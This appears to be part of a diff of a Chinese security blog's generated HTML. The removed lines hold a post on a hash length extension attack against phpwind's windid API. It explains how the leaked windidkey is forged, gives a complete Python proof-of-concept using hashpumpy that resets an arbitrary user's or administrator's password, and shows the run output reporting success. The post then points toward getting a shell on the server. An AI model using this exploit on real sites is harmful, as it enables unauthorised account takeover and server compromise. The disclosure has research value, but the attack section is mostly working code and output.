(in_array($k, $array)) continue;</div><div class="line">		$str .=$k.$v;</div><div class="line">	&#125;</div><div class="line">	foreach ($post AS $k=&gt;$v) &#123;</div><div class="line">		if (in_array($k, $array)) continue;</div><div class="line">		$str .=$k.$v;</div><div class="line">	&#125;</div><div class="line">	return md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在函数中<code>md5(md5($apiId.&#39;||&#39;.$secretkey).$time.$str)</code>的值是知道的，即<a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html" target="_blank" rel="external">windidkey，这个值在用户上传头像处泄露</a>，<code>md5($apiId.&#39;||&#39;.$secretkey)</code>的长度是知道的，32bit，<code>$time.$str</code>参数是用户可控的，那么就满足了哈希扩展长度攻击，下面我们看下用户上传头像处的请求，右键查看源代码找到如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.106/windid/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid=2&amp;windidkey=b6f98f9e78105ca0ec4239de8478cd26&amp;time=1465977216&amp;clientid=1&amp;type=flash&amp;avatar=http://192.168.3.106/windid/attachment//avatar/000/00/00/2.jpg?r=18504</div></pre></td></tr></table></figure></p>
-<p>接着看实际构造的appKey的参数效果,这个可以根据trace的结果直接给出，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md5(&apos;520a1e355b8cfc82e56ae578176d7f101465977216adoAvatarcavatarmapitypeflashuid2uidundefined&apos;) /var/www/html/src/windid/service/base/WindidUtility.php:54</div></pre></td></tr></table></figure></p>
-<p><code>md5($apiId.&#39;||&#39;.$secretkey)</code>的值为<code>520a1e355b8cfc82e56ae578176d7f10</code>，<code>$time</code>为<code>1465977216</code>,<code>$str</code>为<code>adoAvatarcavatarmapitypeflashuid2uidundefined</code>,从appKey函数的实现来看，$str就是get，post请求进行取舍排序得到的。有了这个基础，根据hashpump公式，在post请求中加入我们的参数，并计算出合适的windidkey值，提交请求，就可达到目的。</p>
-<p>#3 利用POC<br>可利用如下的代码构造post请求，修改某uid用户的密码。如果修改的是管理员的密码，并且这管理员有相应的后台权限，那么我们就可以在后台getshell，利用脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">#!env python</div><div class="line"># coding=utf-8</div><div class="line">import hashpumpy</div><div class="line">import urllib</div><div class="line">import urlparse</div><div class="line">import urllib2</div><div class="line">import requests</div><div class="line"></div><div class="line">def md5hack(md5, ori_str, append, security_len):</div><div class="line">    md5, message = hashpumpy.hashpump(md5, ori_str,append, security_len)</div><div class="line">    quoted_message = urllib.quote(message)</div><div class="line">    print &apos;md5 after hash length attacked:&apos;,md5</div><div class="line">    print &apos;message:&apos;,message</div><div class="line">    print &apos;quote message:&apos;,quoted_message</div><div class="line">    return (md5,quoted_message)</div><div class="line"></div><div class="line"></div><div class="line">def modify_passwd(ip, uid, target_uid, windidkey, padding, time, password=&quot;GongFang9&quot;):</div><div class="line">    &quot;&quot;&quot;修改后台管理员的密码&quot;&quot;&quot;</div><div class="line">    target_uid = target_uid #uid是后台管理的uid参数</div><div class="line">    host = &quot;http://&quot; + ip</div><div class="line">    data = &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid, password)</div><div class="line">    url = &quot;&#123;0&#125;/windid/index.php?windidkey=&#123;1&#125;&amp;adoAvatarcavatarmapitypeflashuid&#123;2&#125;uidundefined=&#123;3&#125;&amp;clientid=1&amp;time=&#123;4&#125;&amp;namespace=site&quot;.format(host,windidkey,uid,padding,time)</div><div class="line">    print &apos;url:&apos;,url</div><div class="line">    print &apos;data:&apos;,data</div><div class="line">    r = requests.post(url,data=data)</div><div class="line">    #r = requests.post(url,data=data,headers=headers)</div><div class="line">    print r.text</div><div class="line">    if r.text.strip() == &quot;1&quot;:</div><div class="line">        print &apos;modify password Succeed&apos;</div><div class="line">    else:</div><div class="line">        print &apos;failed&apos;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    &quot;&quot;&quot;点开用户头像上传处,右键查看源码,搜索windidkey,拷贝含flash字段的那个request作为r参数&quot;&quot;&quot;</div><div class="line">    r = &quot;&quot;&quot;http%3A%2F%2F192.168.3.106%2Fwindid%2Findex.php%3Fm%3Dapi%26c%3Davatar%26a%3DdoAvatar%26uid%3D5%26windidkey%3D1eb5af71d002ac89e22c0170806b0fe8%26time%3D1466416702%26clientid%3D1%26type%3Dflash&amp;avatar=http%3A%2F%2F192.168.3.106%2Fwindid%2Fattachment%2F%2Favatar%2F000%2F00%2F00%2F5.jpg%3Fr%3D78057&quot;&quot;&quot;</div><div class="line"></div><div class="line">    request = urlparse.urlparse(urllib.unquote(r))</div><div class="line">    querys = [item for item in request.query.split(&quot;&amp;&quot;)]</div><div class="line">    query_dict = &#123;item.split(&quot;=&quot;)[0]:item.split(&quot;=&quot;)[1] for item in querys&#125;</div><div class="line"></div><div class="line">    ori_md5 = query_dict.get(&quot;windidkey&quot;)</div><div class="line">    time = query_dict.get(&apos;time&apos;)</div><div class="line">    uid = query_dict.get(&apos;uid&apos;)</div><div class="line"></div><div class="line">    ori_str = &quot;&#123;0&#125;adoAvatarcavatarmapitypeflashuid&#123;1&#125;uidundefined&quot;.format(time,uid)</div><div class="line">    password = &quot;test123&quot;</div><div class="line">    ip = &quot;192.168.3.173&quot;</div><div class="line">    ip = &quot;192.168.3.106&quot;</div><div class="line">    target_uid = 3</div><div class="line"></div><div class="line">    post_append= &quot;a=getConfig&amp;c=config&amp;m=api&amp;id=1&quot;</div><div class="line">    post_append= &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid,password)</div><div class="line">    post = &quot;&quot;.join(sorted([item.replace(&quot;=&quot;,&quot;&quot;) for item in post_append.split(&quot;&amp;&quot;)]))</div><div class="line"></div><div class="line">#    security = &quot;d2edc0a3340df65cb66387464f3adfc1&quot;</div><div class="line">#    ori_str = &quot;1465784719adoAvatarcavatarmapitypeflashuid2uidundefined&quot;</div><div class="line">    security_len = 32#phpwind计算windidkey 公式md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str),md5值的长度是32</div><div class="line">    print &apos;hashmd5:&apos;,ori_md5</div><div class="line">    print &apos;security len:&apos;, security_len</div><div class="line">    print &apos;ori_str&apos;, ori_str</div><div class="line">    append = &apos;agetcappid1mapi&apos;</div><div class="line">    append = &quot;namespacesite&quot; + post</div><div class="line">    print &apos;post&apos;,append</div><div class="line">    (md5,quoted_message) = md5hack(ori_md5, ori_str, append, security_len)</div><div class="line">    padding = quoted_message[quoted_message.index(&quot;%&quot;):quoted_message.rindex(&quot;%&quot;)+3]</div><div class="line"></div><div class="line">    modify_passwd(ip, uid, target_uid, md5, padding, time, password)</div></pre></td></tr></table></figure></p>
-<p>运行之后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# python md5hack.py</div><div class="line">hashmd5: 4d8971d0d2556d5dcbeb3b0f10e41429</div><div class="line">security len: 32</div><div class="line">ori_str 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined</div><div class="line">post namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">md5 after hash length attacked: e46e0aaddbd4e008077535a4dafab3f5</div><div class="line">message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined▒▒namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">quote message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">url: http://192.168.3.173/windid/index.php?windidkey=e46e0aaddbd4e008077535a4dafab3f5&amp;adoAvatarcavatarmapitypeflashuid10uidundefined=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00&amp;clientid=1&amp;time=1466474956&amp;namespace=site</div><div class="line">data: a=editUser&amp;c=user&amp;m=api&amp;uid=3&amp;password=test123</div><div class="line">1</div><div class="line">modify password Succeed</div></pre></td></tr></table></figure></p>
-<p>代码中修改uid为3的账户的密码为GongFang7，假设该用户具有后台管理员权限，进入后台getshell，具体的getshell可参考<a href="http://www.wooyun.org/bugs/wooyun-2016-0175518" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0175518</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2256,7 +2258,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-count">34</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2277,8 +2279,8 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">120</span>
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">123</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
